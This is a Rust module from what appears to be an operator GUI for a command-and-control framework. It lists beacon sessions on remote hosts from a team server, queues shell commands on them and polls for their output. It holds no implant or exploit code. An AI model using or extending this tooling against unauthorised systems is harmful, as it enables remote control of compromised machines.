//! Data bridge: the ONLY place that touches the network or blocks.
//!
//! Architecture (validated against Makepad 2.0's `automate` example):
//!
//! ```text
//!   UI thread (Makepad main)            IO worker (std::thread + tokio)
//!   ┌──────────────────────┐            ┌───────────────────────────┐
//!   │ App                  │            │ reqwest async client      │
//!   │  state_updates:      │  Snapshot  │  - GET /api/sessions 2s  │
//!   │    ToUIReceiver <────├────────────┤  - per-task result poll   │
//!   │  ui_controls:        │  Cmd       │    (exponential backoff)  │
//!   │    FromUISender ────>├────────────>│ send() = set_ui_signal() │
//!   └──────────────────────┘            └───────────────────────────┘
//! ```
//!
//! `ToUISender::send()` calls `SignalToUI::set_ui_signal()`, which wakes the
//! Makepad event loop; `App::handle_signal` (via `MatchEvent`) drains the
//! channel and refreshes. The UI thread NEVER blocks on IO — it only ever
//! copies cheap `Vec`s out of the channel. This is what makes the client
//! "fast + low-resource": the GPU renders at the monitor's native rate, IO is
//! off-thread, and the UI redraws only when a snapshot changes.

use std::time::{Duration, Instant};

use makepad_widgets::log;
// `ToUIReceiver`/`FromUISender` come from makepad-network, which platform
// re-exports as `makepad_platform::makepad_network` (platform/src/lib.rs:90).
// widgets → draw → platform, so we reach it via makepad_widgets.
use makepad_widgets::makepad_platform::makepad_network::ui_signal::{
    FromUIReceiver, FromUISender, ToUIReceiver, ToUISender,
};
use serde::Deserialize;

// ---- wire types (mirror the REST API; same shapes as the egui client) ----

/// One beacon session, as returned by `GET /api/sessions`.
#[derive(Debug, Clone, Deserialize)]
pub struct SessionView {
    pub id: String,
    pub hostname: String,
    pub username: String,
    pub os: String,
    #[serde(default)]
    pub is_admin: u8,
    #[serde(default)]
    pub pending: usize,
    #[serde(default)]
    pub beacon_id: u32,
    #[serde(default)]
    pub arch: u8,
    #[serde(default)]
    pub pid: u32,
}

/// A full UI snapshot pushed worker→UI. Coarse-grained on purpose: the worker
/// owns the polling cadence and only sends when something changed, so the UI
/// redraws at most once per poll interval (default 2s), not per byte of shell
/// output.
#[derive(Debug, Clone, Default)]
pub struct Snapshot {
    /// Most recent session list (empty until the first successful fetch).
    pub sessions: Vec<SessionView>,
    /// Log lines accumulated since the last snapshot. The UI appends these to
    /// its event log; the worker trims its own buffer so this channel can't
    /// grow unbounded (H2-style memory-DoS guard).
    pub log_lines: Vec<String>,
    /// Connection state — drives the top status bar.
    pub connected: bool,
}

/// UI→worker command. Enum keeps the channel message type closed and explicit.
#[derive(Debug, Clone)]
pub enum Cmd {
    /// Target team server base URL (e.g. `http://127.0.0.1:8443`).
    Connect { server: String },
    /// Enqueue a shell task on the given session.
    Shell { session: String, args: String },
    /// Stop the worker loop (app shutdown).
    Shutdown,
}

/// Default poll interval for the session list. Short enough to feel live,
/// long enough to not hammer the team server. Tunable later via profile.
const SESSION_POLL: Duration = Duration::from_secs(2);

/// Bound on the worker's pending log buffer — if the UI hasn't drained this
/// many lines we drop oldest. Prevents a slow UI from OOMing the worker if
/// the server floods events (mirrors the server's own H2 memory-DoS bound).
const LOG_BUFFER_CAP: usize = 1024;

/// Channels the `App` holds. Returned by [`spawn`].
pub struct Bridge {
    /// Worker→UI snapshots. Drain in `handle_signal`.
    pub to_ui: ToUIReceiver<Snapshot>,
    /// UI→worker commands. Send on button clicks.
    pub from_ui: FromUISender<Cmd>,
}

/// Spin up the IO worker and return the channel ends the App holds.
///
/// The worker owns its own tokio runtime so the rest of the crate stays
/// sync-friendly (Makepad's event loop is sync). One thread, one runtime —
/// `current_thread` keeps it to a single OS thread: minimal footprint, fits
/// "low-resource". No thread-pool proliferation.
pub fn spawn() -> Bridge {
    let to_ui: ToUIReceiver<Snapshot> = ToUIReceiver::default();
    let sender = to_ui.sender();
    let mut from_ui: FromUISender<Cmd> = FromUISender::default();
    // receiver() consumes &mut self and can only be called once — do it here,
    // before handing the sender end to the App.
    let cmd_rx = from_ui.receiver();

    std::thread::spawn(move || {
        let rt = match tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
        {
            Ok(rt) => rt,
            Err(e) => {
                log!("nyx bridge: tokio runtime build failed: {e}");
                return;
            }
        };
        rt.block_on(worker_loop(cmd_rx, sender));
    });

    Bridge { to_ui, from_ui }
}

// ---- worker loop -----------------------------------------------------------

async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
    let mut server: Option<String> = None;
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(8))
        .build()
        .expect("reqwest client build");

    // Pending (session, task_id) pairs whose result we're still polling.
    // Each gets an exponential backoff so a slow task doesn't spin.
    let mut pending: Vec<(String, u64, Duration, Instant)> = Vec::new();
    let mut log_buf: Vec<String> = Vec::new();
    let mut last_session_sig = String::new();

    loop {
        // 1. Drain any UI→worker commands (non-blocking). `FromUIReceiver` is
        //    a std mpsc under the hood; try_recv is non-blocking.
        while let Ok(cmd) = cmd_rx.try_recv() {
            match cmd {
                Cmd::Shutdown => return,
                Cmd::Connect { server: s } => {
                    log_push(&mut log_buf, &format!("connecting to {s} …"));
                    server = Some(s);
                    let _ = to_ui.send(take_snapshot(&mut log_buf, false, &[]));
                }
                Cmd::Shell { session, args } => {
                    let Some(ref srv) = server else {
                        log_push(&mut log_buf, "! not connected");
                        continue;
                    };
                    match enqueue_shell(&client, srv, &session, &args).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!("[{}] $ {} → task {}", &session[..session.len().min(8)], args, tid),
                            );
                            pending.push((session, tid, Duration::from_millis(500), Instant::now()));
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! enqueue: {e}")),
                    }
                }
            }
        }

        let Some(ref srv) = server else {
            // Not connected yet — idle, but keep draining cmds.
            tokio::time::sleep(Duration::from_millis(200)).await;
            continue;
        };

        // 2. Refresh session list (throttled to SESSION_POLL).
        match fetch_sessions(&client, srv).await {
            Ok(list) => {
                let sig = session_signature(&list);
                let changed = sig != last_session_sig;
                if changed {
                    last_session_sig = sig;
                }
                // Push whenever the list changed OR there are buffered log
                // lines (task results) to deliver.
                if changed || !log_buf.is_empty() {
                    let _ = to_ui.send(take_snapshot(&mut log_buf, true, &list));
                }
            }
            Err(e) => {
                log_push(&mut log_buf, &format!("! sessions: {e}"));
                let _ = to_ui.send(take_snapshot(&mut log_buf, false, &[]));
            }
        }

        // 3. Poll pending task results (with per-task backoff).
        let mut still_pending = Vec::new();
        for (session, tid, backoff, last_poll) in pending.drain(..) {
            if last_poll.elapsed() < backoff {
                still_pending.push((session, tid, backoff, last_poll));
                continue;
            }
            match poll_result(&client, srv, &session, tid).await {
                Ok(Some(out)) => {
                    if !out.is_empty() {
                        log_push(&mut log_buf, &format!("[{}] {}", &session[..session.len().min(8)], out));
                    }
                }
                Ok(None) => {
                    // Not ready yet — back off harder (cap at 4s).
                    let next = backoff.saturating_mul(2).min(Duration::from_secs(4));
                    still_pending.push((session, tid, next, Instant::now()));
                }
                Err(e) => log_push(
                    &mut log_buf,
                    &format!("[{}] ! {}", &session[..session.len().min(8)], e),
                ),
            }
        }
        pending = still_pending;

        // Flush any task-result log lines accumulated this cycle.
        if !log_buf.is_empty() {
            let _ = to_ui.send(Snapshot {
                log_lines: std::mem::take(&mut log_buf),
                connected: true,
                sessions: Vec::new(),
            });
        }

        tokio::time::sleep(SESSION_POLL).await;
    }
}

fn take_snapshot(log_buf: &mut Vec<String>, connected: bool, sessions: &[SessionView]) -> Snapshot {
    Snapshot {
        sessions: sessions.to_vec(),
        log_lines: std::mem::take(log_buf),
        connected,
    }
}

// ---- REST helpers (all async, all on the worker) ---------------------------

async fn fetch_sessions(c: &reqwest::Client, server: &str) -> anyhow::Result<Vec<SessionView>> {
    Ok(c.get(format!("{server}/api/sessions")).send().await?.json().await?)
}

#[derive(Deserialize)]
struct TaskAck {
    task_id: u64,
}

#[derive(Deserialize)]
struct ResultView {
    task_id: u64,
    kind: String,
    text: String,
}

async fn enqueue_shell(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    args: &str,
) -> anyhow::Result<u64> {
    let body = serde_json::json!({
        "session": session,
        "command": { "type": "shell", "args": args }
    });
    let ack: TaskAck = c
        .post(format!("{server}/api/task"))
        .json(&body)
        .send()
        .await?
        .json()
        .await?;
    Ok(ack.task_id)
}

async fn poll_result(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    task_id: u64,
) -> anyhow::Result<Option<String>> {
    let rs: Vec<ResultView> = c
        .get(format!("{server}/api/results"))
        .query(&[("session", session)])
        .send()
        .await?
        .json()
        .await?;
    Ok(rs.into_iter().find(|r| r.task_id == task_id).map(|r| match r.kind.as_str() {
        "output" => r.text,
        "ok" => String::new(),
        "error" => format!("[error] {}", r.text),
        other => format!("[{other}] {}", r.text),
    }))
}

/// A cheap signature of the session list so the worker only pushes a snapshot
/// when the set actually changed (id/host/user/admin/pending), avoiding a
/// redraw storm on every 2s poll when nothing moved.
fn session_signature(list: &[SessionView]) -> String {
    let mut s = String::new();
    for v in list {
        s.push_str(&v.id);
        s.push('|');
        s.push_str(&v.hostname);
        s.push('|');
        s.push_str(&v.username);
        s.push('|');
        s.push_str(&format!("{}|{}", v.is_admin, v.pending));
        s.push(';');
    }
    s
}

fn log_push(buf: &mut Vec<String>, line: impl Into<String>) {
    buf.push(line.into());
    if buf.len() > LOG_BUFFER_CAP {
        let drop = buf.len() - LOG_BUFFER_CAP;
        buf.drain(..drop);
    }
}
